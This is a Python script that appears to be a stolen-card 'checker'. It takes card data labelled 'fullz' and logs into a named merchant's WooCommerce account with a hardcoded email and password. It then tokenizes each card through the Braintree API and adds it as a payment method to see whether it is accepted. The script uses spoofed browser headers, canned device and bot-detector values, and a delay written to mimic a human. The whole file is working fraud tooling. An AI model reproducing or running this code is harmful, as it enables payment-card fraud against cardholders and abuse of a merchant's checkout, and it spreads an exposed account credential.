import asyncio
import requests
from fake_useragent import UserAgent
import re
from FUNC.defs import *
import json
import base64
import random
from bs4 import BeautifulSoup
import time



def extract_string(s, start, end):
    """Extract a substring between two delimiters."""
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def create_braintree_auth(fullz, session):
    try:
        # Split the fullz into individual components
        cc, mes, ano, cvv = fullz.split("|")
        
        # Generate random user and email
        user = f"cristniki{random.randint(9999, 574545)}"
        mail = f"{user}@gmail.com"

        # Initialize session
        session = requests.Session()

        # Headers for the initial request
        headers = {
            'authority': 'digicel.net',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://digicel.net/my-account/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        # Get login page to extract nonce
        response = session.get('https://digicel.net/my-account/', headers=headers)
        login_nonce = extract_string(response.text, 'input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="', '" />')

        if not login_nonce:
            return "Failed to extract login nonce."

        # Login payload
        headers['content-type'] = 'application/x-www-form-urlencoded'
        login_data = {
            'username': 'anonymoussurojit@gmail.com',
            'password': 'FFaa55@&##',
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }

        # Perform login
        response = session.post('https://digicel.net/my-account/', headers=headers, data=login_data)
        if response.status_code != 200:
            return "Login failed."

        # Get payment method page to extract client token and nonce
        headers['referer'] = 'https://digicel.net/my-account/payment-methods/'
        response = session.get('https://digicel.net/my-account/add-payment-method/', headers=headers)
        client_token_match = re.search(r'var wc_braintree_client_token = \[(".*?")\]', response.text)
        payment_nonce_match = re.search(r'input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response.text)

        if not client_token_match or not payment_nonce_match:
            return "Failed to extract client token or payment nonce."

        token = client_token_match.group(1)
        nonce0 = payment_nonce_match.group(1)
        decoded_token = base64.b64decode(token).decode('utf-8')
        token_json = json.loads(decoded_token)
        autho = token_json.get('authorizationFingerprint')

        if not autho:
            return "Failed to extract authorization fingerprint."

        # Prepare headers for Braintree API request
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': f'Bearer {autho}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://digicel.net/my-account',
            'referer': 'https://digicel.net/my-account/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        # GraphQL query to get client configuration
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'f2cea622-0c78-492c-ae6e-634fa48eb463',
            },
            'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
            'operationName': 'ClientConfiguration',
        }

        response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        if response.status_code != 200:
            return "Failed to get client configuration."

        data = response.json()
        access_token = data["data"]["clientConfiguration"]["braintreeApi"]["accessToken"]
        merchant_id = data["data"]["clientConfiguration"]["merchantId"]
        client_id = data["data"]["clientConfiguration"]["paypal"]["clientId"]
        braintree_client_id = data["data"]["clientConfiguration"]["paypal"]["braintreeClientId"]

        # Tokenize credit card
        headers = {
            'Accept': '*/*',
            'Authorization': f'Bearer {autho}',
            'Braintree-Version': '2018-05-10',
            'Content-Type': 'application/json',
            'Origin': 'https://assets.braintreegateway.com',
            'Referer': 'https://assets.braintreegateway.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '7434070c-bb48-4f87-9f21-48364df5a79f',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        if response.status_code != 200:
            return "Failed to tokenize credit card."

        data = response.json()
        token1 = data["data"]["tokenizeCreditCard"]["token"]
        ext = data["extensions"]["requestId"]

        # Add payment method
        headers = {
            'authority': 'digicel.net',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://digicel.net',
            'referer': 'https://digicel.net/my-account/add-payment-method/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token1,
            'braintree_cc_device_data': '{"device_session_id":"70d3d76800e1709657461fa890d90025","fraud_merchant_id":null,"correlation_id":"e5defb84-44f2-4756-a2c0-54e9f510"}',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/gv73hbgxvw5vx9tp/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/gv73hbgxvw5vx9tp"},"merchantId":"merchant_id","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"braintreeApi":{"accessToken":"access_token","url":"https://payments.braintree-api.com"},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Visa","MasterCard","Discover","JCB","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"DigiCel Inc.,","clientId":"client_id","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"braintree_client_id","billingAgreementsEnabled":true,"merchantAccountId":"DigiCelInc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
            'billing_address_1': '123 Allen Street',
            'woocommerce-add-payment-method-nonce': nonce0,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
            'ct_bot_detector_event_token': '22dfde97d792b6b92f25a72da634c4156b4c80162d849ed97e98629ca680522d',
            'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiYmlsbGluZ19hZGRyZXNzXzEiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MSwiaW52aXNpYmxlX2ZpZWxkcyI6ImJyYWludHJlZV9jY19ub25jZV9rZXkgYnJhaW50cmVlX2NjX2RldmljZV9kYXRhIGJyYWludHJlZV9jY18zZHNfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19jb25maWdfZGF0YSB3b29jb21tZXJjZS1hZGQtcGF5bWVudC1tZXRob2Qtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciB3b29jb21tZXJjZV9hZGRfcGF5bWVudF9tZXRob2QgY3RfYm90X2RldGVjdG9yX2V2ZW50X3Rva2VuIGN0X25vX2Nvb2tpZV9oaWRkZW5fZmllbGQiLCJpbnZpc2libGVfZmllbGRzX2NvdW50Ijo5fX0=',
            'ct_no_cookie_hidden_field': '',
        }

        time.sleep(5)  # Simulate human delay
        response = session.post('https://digicel.net/my-account/add-payment-method/', headers=headers, data=data)
        soup = BeautifulSoup(response.text, 'html.parser')
        notice_banner = soup.find('div', class_='wc-block-components-notice-banner__content')
        response_text = notice_banner.get_text(strip=True) if notice_banner else "No notice banner found"
        return response_text

    except Exception as e:
        return str(e)

# Example usage
# fullz = "4111111111111111|12|2025|123"
# result = create_payment_method(fullz)
# print(result)